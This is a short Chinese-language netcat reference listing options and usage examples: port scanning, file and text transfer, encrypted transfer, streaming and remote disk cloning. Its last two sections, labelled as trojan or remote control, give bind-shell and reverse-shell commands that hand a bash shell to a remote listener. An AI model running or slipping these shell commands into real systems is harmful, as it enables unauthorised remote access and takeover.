# nc

## 参数
```shell
-g<网关> : 设置路由器跃程通信网关，最多设置8个； 
-G<指向器数目> : 设置来源路由指向器，其数值为4的倍数； 
-h : 在线帮助； 
-i<延迟秒数> : 设置时间间隔，以便传送信息及扫描通信端口； 
-l : 使用监听模式，监控传入的资料； 
-n : 直接使用ip地址，而不通过域名服务器； 
-o<输出文件> : 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存； 
-p<通信端口> : 设置本地主机使用的通信端口； 
-r : 指定源端口和目的端口都进行随机的选择； 
-s<来源位址> : 设置本地主机送出数据包的IP地址； 
-u : 使用UDP传输协议； 
-v : 显示指令执行过程； 
-w<超时秒数> : 设置等待连线的时间； 
-z : 使用0输入/输出模式，只在扫描通信端口时使用。 
```

## 例子
- 端口扫描
```shell
# 扫描 192.168.234.2 的全部端口
nc -nv -z 192.168.234.2 1-65535 
```

- 传送文本信息
```shell
# server
nc -l -p 333

# client
c -nv ip 333
```

- 文件传送
```shell
# server
nc -lp 333 < mi.mp4 -q 1

# client
nc -nv ip 333 > 1.MP4 
```

- 加密传输
```shell
# server
nc -l -p 444 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > B.zip

# client
mcrypt --flush -Fbq -a rijndael-256 -m ecb < A.zip | nc -nv 192.168.234.131 444 -q 1
    –flush 意思为加解密完成后，会销毁加密密钥，不会在本地保存
    -Fbq 加密  -Fbqd 解密
    rijndael-256  为加密算法
    ecb 为加密方法
```

- 流媒体服务器
```shell
# server
cat A.mp4 | nc -l -p 444

# client
nc -nv 192.168.234.131 444 | mplayer -vo x11 -cache 3000 -
    -cache 3000 为缓存大小
```

- 远程克隆硬盘
```shell
# server
nc -l -p 444 | dd of=/dev/sda

# client
dd if=/dev/sda | nc -nv 192.168.234.131 444 -q 1
```

- 远程控制 / 木马  正向控制连接 
```shell
# 被控
nc -l -p 444 -c bash

# 控制
nc -nv 192.168.1.131 444
```

- 远程控制 / 木马  反向控制连接 
```shell
# 被控
nc -nv 192.168.1.131 444 -c bash

# 控制
nc -l -p 444
```
